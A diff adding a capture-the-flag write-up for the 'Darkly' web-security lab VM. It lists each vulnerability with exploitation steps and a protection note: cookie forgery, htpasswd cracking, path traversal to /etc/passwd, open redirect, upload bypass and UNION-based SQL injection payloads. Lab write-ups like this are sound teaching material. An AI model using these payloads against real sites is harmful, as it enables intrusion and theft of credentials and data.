@@ -1,0 +1,94 @@
+#+TITLE: Write Up for Darkly project
+
+* Prerequesite
+
+Lauch the VM and access to the IP indicated.
+
+* hidden_attribute
+** Vulnerability
+On the page http://192.168.56.105/index.php?page=signin there is link to recover password and on this page there is an hidden form.
+1. insepect the page
+2. fill the form
+3. click on the submit button
+** Protection
+ Don't use hidden tag in html for sensitive information !
+
+* csrf_cookie
+** Vulnerability
+The website gives us a cookie in order to check if we are admin or not. This cookie is a simple md5 hash which means 'false'. We can replace it by the corresping hash for 'true'.
+1. ~hashid 68934a3e9455fa72420237eb05902327~
+2. ~echo -n "true" | md5~
+3. replace cookie with the result of the echo command.
+4. reload the page
+** Protection
+A boolean is not enough, there must be a complex system of identification by user in the backend. (and don't use explicit sentences as 'I_am_admin'). It's also important to use the 'SameSite' attribute for cookies.
+* informations_leaks
+** Vulnerability
+By doing some fuzzing on the website, we can found the file *robots.txt* which reveals informations of the content of the site.
+On the page http://192.168.56.105/whatever/ there is a *htpasswd* file.
+1. ~ffuf -w ./informations_leaks/ressources/common.txt:FUZZ -u "http://192.168.56.105/FUZZ"~
+2. go to http://192.168.56.105/robots.txt
+3. go to http://192.168.56.105/whatever/
+4. ~wget http://192.168.56.105/whatever/htpasswd~
+5. use https://crackstation.net/ to decode the hash
+6. go to http://192.168.56.105/admin/
+7. log-in with root:dragon
+** Protection
+Don't store sensitive informations in the *robots.txt* file, assume that attackers will pay close attention to any locations identified in the file.
+* insecure_path
+** Vulnerability
+ On the page http://192.168.56.105/.hidden/ found by the *robots.txt* there is some kind of labyrinth to protect the flag. But it stills vulnerable to crawling.
+ 1. cd ./insecure_path/ressources
+ 2. ~bash crawl.sh "http://192.168.56.105/.hidden/" url_1 url_2 url_3~
+ 3. ~grep -v "gauche\|droite\|dessus\|dessous\|aussi\|bon\|non" result.txt~
+** Protection
+Don't hide important informations like that. Use authentication or *htaccess* file to protect the folder.
+* redirection
+** Vulnerability
+In the footer of the main page, the website has redirection of social media. We can change these redirection with anything we want and potentially to malicious pages.
+1. change "site=facebook" by "site=google"
+2. click on the link
+** Protection
+It's possible to check the redirection with some arrays, so it would not be possible to redirect on anything other that we predefined.
+* idor_page
+** Vulnerability
+Indirect object references is a vulnerability that arises when an application uses user-supplied input to access objects directly. In whatever page on the site there is an attribute *page* in the url, we can change this attribute to access to anything on the server.
+1. change http://192.168.56.105/index.php?page=sigin by
+http://192.168.56.105/index.php?page=../../../../../../../etc/passwd
+** Protection
+Use an array of valid url, the attacker will have access only to these arrays.
+* idor_form
+** Vulnerability
+On the page http://192.168.56.105/index.php?page=survey there is a survey where we vote for people. By doing a vote, a POST request is made, we can change the values of this request.
+1. press F12
+2. vote for a person
+3. go to the 'network' tab
+4. edit the request and change the value by 42
+5. send a look at the response
+** Proection
+Sanitize the input of the form in the backend and not only in the frontend !
+
+* insecure_upload
+** Vulnerability
+It's possible to upload an image on the page http://192.168.56.105/?page=upload . The website only check the header of the request for the uploaded file.
+1. press F12
+2. upload a .php file
+3. change the request, *Content-Type: text/php* by *Content-Type: images/jpeg*
+4. send and look at the response
+** Protection
+Looking at the header is not enough.
+* sql_injection
+** Vulnerability
+On the page http://192.168.56.105/index.php?page=member we can search users by their 'id'. If we enter a letter for example, an error is displayed which reveals that it reads sql commands.
+
+1. 1 OR 1
+2. 5 UNION SELECT database(),2
+3. 5 UNION SELECT table_schema,table_name FROM information_schema.columns
+4. 5 UNION SELECT table_name,column_name FROM information_schema.columns
+5. 5 UNION SELECT user_id,planet FROM users
+6. 5 UNION SELECT user_id,countersign FROM users
+7. 5 UNION SELECT user_id,commentaire FROM users
+8. ~echo -n 'fortytwo' | sha2~
+** Protection
+Sanitize the input of form and use parametrized queries.
+Parameterized queries are a means of pre-compiling an SQL statement so that you can then supply the parameters in order for the statement to be executed. This method makes it possible for the database to recognize the code and distinguish it from input data.
